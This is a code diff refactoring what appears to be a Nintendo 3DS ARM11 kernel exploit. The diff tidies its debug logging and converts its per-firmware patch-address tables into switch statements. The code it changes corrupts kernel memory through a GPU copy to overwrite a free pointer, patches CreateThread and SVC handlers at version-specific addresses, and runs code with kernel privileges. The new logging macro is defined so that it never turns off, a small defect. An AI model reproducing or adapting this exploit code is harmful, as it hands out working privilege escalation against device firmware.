@@ -9,13 +9,17 @@ u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 unsigned int patch_addr;
 unsigned int svc_patch_addr;
 unsigned char patched_svc = 0;
-unsigned int kversion;
-u8 isN3DS = 0;
 u32 *backup;
 unsigned int *arm11_buffer;
 
-//Uncomment to have progress printed w/ printf
+// Uncomment to have progress printed w/ printf
 #define DEBUG_PROCESS
+
+#define dbg_log(...) printf(__VA_ARGS__)
+#ifdef DEBUG_PROCESS
+#else
+#define dbg_log(...)
+#endif
 
 int do_gshax_copy(void *dst, void *src, unsigned int len)
 {
@@ -48,75 +52,71 @@ void dump_bytes(void *dst) {
 int get_version_specific_addresses()
 {
 	// get proper patch address for our kernel -- thanks yifanlu once again
-	kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register
+	u32 kversion = *(vu32*)0x1FF80000; // KERNEL_VERSION register
+
 	patch_addr = 0;
 	svc_patch_addr = 0;
+
+	u8 isN3DS = 0;
 	APT_CheckNew3DS(NULL, &isN3DS);
 
 	if(!isN3DS || kversion < 0x022C0600)
 	{
-		if (kversion == 0x02220000) // 2.34-0 4.1.0
+		switch (kversion)
 		{
-			patch_addr = 0xEFF83C97;
-			svc_patch_addr = 0xEFF827CC;
-		}
-		else if (kversion == 0x02230600) // 2.35-6 5.0.0
-		{
-			patch_addr = 0xEFF8372F;
-			svc_patch_addr = 0xEFF822A8;
-		}
-		else if (kversion == 0x02240000 || kversion == 0x02250000 || kversion == 0x02260000) // 2.36-0 5.1.0, 2.37-0 6.0.0, 2.38-0 6.1.0
-		{
-			patch_addr = 0xEFF8372B;
-			svc_patch_addr = 0xEFF822A4;
-		}
-		else if (kversion == 0x02270400) // 2.39-4 7.0.0
-		{
-			patch_addr = 0xEFF8372F;
-			svc_patch_addr = 0xEFF822A8;
-		}
-		else if (kversion == 0x02280000) // 2.40-0 7.2.0
-		{
-			patch_addr = 0xEFF8372B;
-			svc_patch_addr = 0xEFF822A4;
-		}
-		else if (kversion == 0x022C0600) // 2.44-6 8.0.0
-		{
-			patch_addr = 0xDFF83767;
-			svc_patch_addr = 0xDFF82294;
-		}
-		else if (kversion == 0x022E0000) // 2.26-0 9.0.0
-		{
-			patch_addr = 0xDFF83837;
-			svc_patch_addr = 0xDFF82290;
-		}
-		else
-		{
-#ifdef DEBUG_PROCESS
-			printf("Unrecognized kernel version %x, returning...\n", kversion);
-#endif
-			return 0;
+			case 0x02220000: // 2.34-0 4.1.0
+				patch_addr = 0xEFF83C97;
+				svc_patch_addr = 0xEFF827CC;
+				break;
+			case 0x02230600: // 2.35-6 5.0.0
+				patch_addr = 0xEFF8372F;
+				svc_patch_addr = 0xEFF822A8;
+				break;
+			case 0x02240000: // 2.36-0 5.1.0
+			case 0x02250000: // 2.37-0 6.0.0
+			case 0x02260000: // 2.38-0 6.1.0
+				patch_addr = 0xEFF8372B;
+				svc_patch_addr = 0xEFF822A4;
+				break;
+			case 0x02270400: // 2.39-4 7.0.0
+				patch_addr = 0xEFF8372F;
+				svc_patch_addr = 0xEFF822A8;
+				break;
+			case 0x02280000: // 2.40-0 7.2.0
+				patch_addr = 0xEFF8372B;
+				svc_patch_addr = 0xEFF822A4;
+				break;
+			case 0x022C0600: // 2.44-6 8.0.0
+				patch_addr = 0xDFF83767;
+				svc_patch_addr = 0xDFF82294;
+				break;
+			case 0x022E0000: // 2.26-0 9.0.0
+				patch_addr = 0xDFF83837;
+				svc_patch_addr = 0xDFF82290;
+				break;
+			default:
+				dbg_log("Unrecognized kernel version 0x%08X, returning...\n", kversion);
+				return 0;
 		}
 	}
 	else
 	{
-		if (kversion == 0x022C0600 || kversion == 0x022E0000) // N3DS 2.44-6 8.0.0, N3DS 2.26-0 9.0.0
+		switch (kversion)
 		{
-			patch_addr = 0xDFF8382F;
-			svc_patch_addr = 0xDFF82260;
-		}
-		else
-		{
-#ifdef DEBUG_PROCESS
-			printf("Unrecognized kernel version %x, returning... %i\n", kversion);
-#endif
-			return 0;
+			case 0x022C0600: // N3DS 2.44-6 8.0.0
+			case 0x022E0000: // N3DS 2.26-0 9.0.0
+				patch_addr = 0xDFF8382F;
+				svc_patch_addr = 0xDFF82260;
+				break;
+			default:
+				dbg_log("Unrecognized kernel version 0x%08X, returning...\n", kversion);
+				return 0;
 		}
 	}
 
-#ifdef DEBUG_PROCESS
-	printf("createThread Addr: %x\nSVC Addr:          %x\n", patch_addr, svc_patch_addr);
-#endif
+	dbg_log("Kernel Version:    0x%08X\n", kversion);
+	dbg_log("CreateThread Addr: 0x%08X\n", patch_addr);
+	dbg_log("SVC Addr:          0x%08X\n", svc_patch_addr);
 	return 1;
 }
 
@@ -129,9 +129,6 @@ int arm11_kernel_exploit_setup(void)
 	int model;
 
 	get_version_specific_addresses();
-#ifdef DEBUG_PROCESS
-	printf("Loaded adr %x for kernel %x\n", patch_addr, kversion); 
-#endif
 
 	// part 1: corrupt kernel memory
 	u32 tmp_addr;
@@ -154,10 +151,8 @@ int arm11_kernel_exploit_setup(void)
 	arm11_buffer[2] = 0;
 	arm11_buffer[3] = 0;
 
-	// overwrite free pointer
-#ifdef DEBUG_PROCESS
-	printf("Overwriting free pointer %x\n", mem_hax_mem);
-#endif
+	// Overwrite free pointer
+	dbg_log("Overwriting free pointer 0x%08X\n", mem_hax_mem);
 
 	//Trigger write to kernel
 	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
@@ -263,9 +258,7 @@ int doARM11Hax()
 	nop_func = nop_slide;
 	HB_FlushInvalidateCache();
 
-#ifdef DEBUG_PROCESS
-	printf("Testing nop slide\n");
-#endif
+	dbg_log("Testing nop slide\n");
 
 	nop_func();
 
@@ -286,9 +279,7 @@ int doARM11Hax()
 
 	if(arm11_kernel_exploit_setup())
 	{
-#ifdef DEBUG_PROCESS
-		printf("Kernel exploit set up, \nExecuting code under ARM11 Kernel...\n");
-#endif
+		dbg_log("Kernel exploit set up\n");
 
 		arm11_kernel_exploit_exec (arm11_kernel_stub);
 		//if(patched_svc > 0)
